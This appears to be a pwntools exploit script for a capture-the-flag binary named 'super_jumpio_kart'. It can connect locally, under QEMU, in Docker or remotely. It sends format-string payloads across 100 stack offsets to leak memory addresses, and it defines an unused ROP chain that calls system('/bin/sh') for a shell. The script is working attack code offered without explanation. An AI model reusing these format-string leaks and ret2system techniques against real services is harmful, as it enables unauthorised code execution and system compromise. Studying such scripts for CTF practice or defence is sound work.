#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './super_jumpio_kart'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# slibc = CDLL("./glibc/libc.so.6")
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-pwndbg
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
def ret2system():
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def exploit(i):
    global io
    io = initialize()
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', b'%%%d$p' % i)
    io.recvuntil(b'with: ')
    print(f"Leak {i}: {io.recvline().strip().decode()}")
    io.close()

if __name__ == '__main__':
    for i in range(100):
        exploit(i)
